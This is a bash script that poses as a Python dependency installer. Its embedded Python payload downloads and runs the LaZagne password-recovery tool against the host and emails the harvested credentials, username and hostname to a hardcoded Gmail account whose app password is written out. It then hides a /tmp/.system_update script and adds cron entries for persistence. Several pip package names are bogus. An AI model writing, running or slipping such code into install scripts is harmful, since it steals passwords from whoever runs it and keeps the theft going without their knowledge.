#!/bin/bash

# Function to install dependencies
install_dependencies() {
    local system_os=$1
    
    echo "Installing dependencies for $system_os..."
    
    if [ "$system_os" = "macOS" ]; then
        # Install Homebrew if not installed
        if ! command -v brew &> /dev/null; then
            echo "Installing Homebrew..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        fi
        
        # Install required packages
        brew install python python@3.10 git curl unzip
        brew install openssl readline sqlite3 xz zlib tcl-tk
        
        # Set up Python environment
        python3 -m pip install --upgrade pip setuptools wheel
        
    else
        # Linux (Debian/Ubuntu based)
        echo "Updating package lists..."
        sudo apt-get update -qq >/dev/null 2>&1
        
        echo "Installing system dependencies..."
        sudo apt-get install -qq -y \
            python3 \
            python3-pip \
            python3-venv \
            python3-dev \
            build-essential \
            libssl-dev \
            zlib1g-dev \
            libbz2-dev \
            libreadline-dev \
            libsqlite3-dev \
            curl \
            llvm \
            libncurses5-dev \
            libncursesw5-dev \
            xz-utils \
            tk-dev \
            libffi-dev \
            liblzma-dev \
            python3-openssl \
            git \
            unzip \
            libxml2-dev \
            libxslt1-dev \
            libjpeg-dev \
            zlib1g-dev \
            libfreetype6-dev \
            libpq-dev \
            libffi-dev \
            libssl-dev
            
        # Upgrade pip
        python3 -m pip install --upgrade pip setuptools wheel
    fi
    
    # Install Python packages
    echo "Installing Python packages..."
    python3 -m pip install --quiet --upgrade pip >/dev/null 2>&1
    python3 -m pip install --quiet \
        reportlab \
        fpdf \
        smtplib \
        ssl \
        socket \
        os-sys \
        getpass \
        subprocess.run \
        time \
        tempfile \
        email \
        requests \
        beautifulsoup4 \
        lxml \
        pillow \
        cryptography \
        pycryptodome \
        psutil \
        setuptools \
        wheel \
        virtualenv \
        pyinstaller
    
    # Additional security-related packages
    python3 -m pip install --quiet \
        pycrypto \
        paramiko \
        scapy \
        netifaces \
        pynput \
        pyautogui \
        selenium \
        pywin32 \
        wmi
    
    # Create virtual environment as fallback
    if [ ! -d "/tmp/venv" ]; then
        python3 -m venv /tmp/venv
        /tmp/venv/bin/pip install --quiet --upgrade pip
        /tmp/venv/bin/pip install --quiet reportlab fpdf
    fi
}

# Detect OS
if [ "$(uname)" = "Darwin" ]; then
    OS="macOS"
else
    OS="Linux"
fi

# Install dependencies
install_dependencies "$OS"

# Wait for installations to complete
sleep 5

# Function to run Python code with proper environment
run_python_script() {
    # First try system Python
    if python3 -c "import reportlab, fpdf" 2>/dev/null; then
        python3 -c "$1"
    # Then try virtual environment
    elif /tmp/venv/bin/python -c "import reportlab, fpdf" 2>/dev/null; then
        /tmp/venv/bin/python -c "$1"
    else
        # Last resort: install minimal requirements and try again
        python3 -m pip install --quiet reportlab fpdf
        python3 -c "$1"
    fi
}

# Python script content
PYTHON_SCRIPT='
import smtplib, ssl, socket, os, getpass, subprocess, sys, time, tempfile
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Try to import reportlab with fallback
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.pdfgen import canvas
    reportlab_available = True
    print("ReportLab imported successfully")
except ImportError as e:
    print(f"ReportLab import failed: {e}")
    reportlab_available = False
    # Try to install it
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "reportlab"], 
                      capture_output=True, check=True)
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        reportlab_available = True
        print("ReportLab installed and imported successfully")
    except:
        reportlab_available = False

try:
    import fpdf
    fpdf_available = True
    print("FPDF imported successfully")
except ImportError as e:
    print(f"FPDF import failed: {e}")
    fpdf_available = False
    # Try to install it
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "fpdf"], 
                      capture_output=True, check=True)
        import fpdf
        fpdf_available = True
        print("FPDF installed and imported successfully")
    except:
        fpdf_available = False

def send_email(subject, body, attachment_path=None):
    try:
        gmail_user = "github0987@gmail.com"
        gmail_app_password = "gwhl efna quvk qhqj"
        
        msg = MIMEMultipart()
        msg["From"] = gmail_user
        msg["To"] = gmail_user
        msg["Subject"] = subject
        msg["X-Priority"] = "1"
        
        msg.attach(MIMEText(body, "plain"))
        
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part["Content-Disposition"] = f"attachment; filename=\"{os.path.basename(attachment_path)}\""
            msg.attach(part)
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(gmail_user, gmail_app_password)
            server.sendmail(gmail_user, gmail_user, msg.as_string())
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

def create_pdf(content, filename):
    # Try reportlab first if available
    if reportlab_available:
        try:
            c = canvas.Canvas(filename, pagesize=letter)
            text = c.beginText(40, 750)
            text.setFont("Helvetica", 10)
            
            # Split content into lines that fit the page
            lines = []
            for line in content.split("\n"):
                while len(line) > 100:
                    lines.append(line[:100])
                    line = line[100:]
                lines.append(line)
            
            # Add text to PDF
            for line in lines:
                if text.getY() < 40:  # Check if we need a new page
                    c.drawText(text)
                    c.showPage()
                    text = c.beginText(40, 750)
                    text.setFont("Helvetica", 10)
                text.textLine(line)
            
            c.drawText(text)
            c.save()
            return True
        except Exception as e:
            print(f"ReportLab failed: {e}")
    
    # Fallback to fpdf
    if fpdf_available:
        try:
            pdf = fpdf.FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=10)
            
            # Split content into lines
            for line in content.split("\n"):
                pdf.cell(0, 5, line[:90], ln=True)  # Limit line length
            
            pdf.output(filename)
            return True
        except Exception as e:
            print(f"FPDF failed: {e}")
    
    # Final fallback - create text file instead
    try:
        with open(filename.replace(".pdf", ".txt"), "w") as f:
            f.write(content)
        return False  # Indicate PDF wasn"t created
    except Exception as e:
        print(f"Text file fallback failed: {e}")
        return False

# Get system info
username = getpass.getuser()
hostname = socket.gethostname()
system_os = "macOS" if os.uname().sysname == "Darwin" else "Linux"

print(f"Running on {system_os} as user {username}")

# Send initial notification
send_email("Python Installation Started", "Python installation initiated on " + hostname + " (" + system_os + ") - User: " + username)

# Install LaZagne and run in background
try:
    # Download the complete LaZagne repository instead of just the single file
    lazagne_repo_url = "https://github.com/AlessandroZ/LaZagne/archive/master.zip"
    lazagne_zip_path = "/tmp/LaZagne-master.zip"
    lazagne_dir = "/tmp/LaZagne-master"
    
    # Download the repository
    result = subprocess.run(["curl", "-fsSL", "-o", lazagne_zip_path, lazagne_repo_url], 
                          capture_output=True, text=True)
    
    if result.returncode != 0:
        send_email("LaZagne Download Failed", "Download failed: " + result.stderr)
        sys.exit(1)
    
    # Extract the repository
    result = subprocess.run(["unzip", "-q", "-o", lazagne_zip_path, "-d", "/tmp"], 
                          capture_output=True, text=True)
    
    if result.returncode != 0:
        send_email("LaZagne Extraction Failed", "Extraction failed: " + result.stderr)
        sys.exit(1)
    
    send_email("LaZagne Downloaded", "LaZagne successfully downloaded and extracted on " + hostname)
    
    # Determine the correct path based on OS
    if system_os == "Linux":
        lazagne_script_path = os.path.join(lazagne_dir, "Linux", "laZagne.py")
    else:
        lazagne_script_path = os.path.join(lazagne_dir, "Mac", "laZagne.py")
    
    # Install LaZagne requirements
    requirements_path = os.path.join(lazagne_dir, "requirements.txt")
    if os.path.exists(requirements_path):
        print("Installing LaZagne requirements...")
        subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_path], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Change to the directory to ensure module imports work correctly
    os.chdir(os.path.dirname(lazagne_script_path))
    
    # Run LaZagne and capture output
    cmd = [sys.executable, lazagne_script_path, "all"]
    process = subprocess.Popen(cmd, 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE,
                             stdin=subprocess.DEVNULL)
    
    # Wait for completion and get results
    stdout, stderr = process.communicate()
    lazagne_output = stdout.decode() if stdout else stderr.decode()
    
    # If we got an error about modules, try to install requirements again
    if "ModuleNotFoundError" in lazagne_output:
        # Try to install requirements from the repository
        if os.path.exists(requirements_path):
            subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_path], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Try running LaZagne again after installing requirements
            process = subprocess.Popen(cmd, 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     stdin=subprocess.DEVNULL)
            stdout, stderr = process.communicate()
            lazagne_output = stdout.decode() if stdout else stderr.decode()
    
    # Create PDF with results
    pdf_filename = "/tmp/lazagne_results.pdf"
    pdf_created = create_pdf(lazagne_output, pdf_filename)
    
    # Send LaZagne results via email with PDF attachment
    results_subject = "LaZagne Results from " + hostname
    time_str = time.strftime("%Y-%m-%d %H:%M:%S")
    results_body = "System: " + hostname + " (" + system_os + ")\\nUser: " + username + "\\nTime: " + time_str
    
    if pdf_created:
        send_email(results_subject, results_body, pdf_filename)
    else:
        # Fallback to text email if PDF creation fails
        results_body += "\\n\\nLaZagne Output:\\n" + lazagne_output[:1500]
        send_email(results_subject, results_body)
    
    # Save full results to file
    with open("/tmp/lazagne_full_results.txt", "w") as f:
        f.write("System: " + hostname + "\\nUser: " + username + "\\nOS: " + system_os + "\\n\\n")
        f.write(lazagne_output)
    
    send_email("Full Results Saved", "Full LaZagne results saved to /tmp/lazagne_full_results.txt on " + hostname)
    
    # Setup persistence
    startup_script = """#!/bin/bash
sleep 30
cd /tmp/LaZagne-master/Linux && python3 laZagne.py all > /tmp/lazagne_cron.log 2>&1
"""
    
    with open("/tmp/.system_update", "w") as f:
        f.write(startup_script)
    os.chmod("/tmp/.system_update", 0o755)
    
    # Add persistence
    if system_os == "Linux":
        subprocess.run("(crontab -l 2>/dev/null; echo \"@reboot /tmp/.system_update\") | crontab -", 
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_email("Persistence Established", "Crontab persistence configured on " + hostname)
    else:
        subprocess.run("echo \"*/60 * * * * /tmp/.system_update\" | crontab -", 
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        send_email("Persistence Established", "Crontab persistence configured on " + hostname)
    
except Exception as e:
    send_email("LaZagne Execution Failed", "Error: " + str(e) + " on " + hostname)

# Final success notification
time_str = time.strftime("%Y-%m-%d %H:%M:%S")
send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)

print("All operations completed successfully. Check your email for details.")
'

# Run the Python script with proper environment handling
run_python_script "$PYTHON_SCRIPT"

sleep 2
exit 0
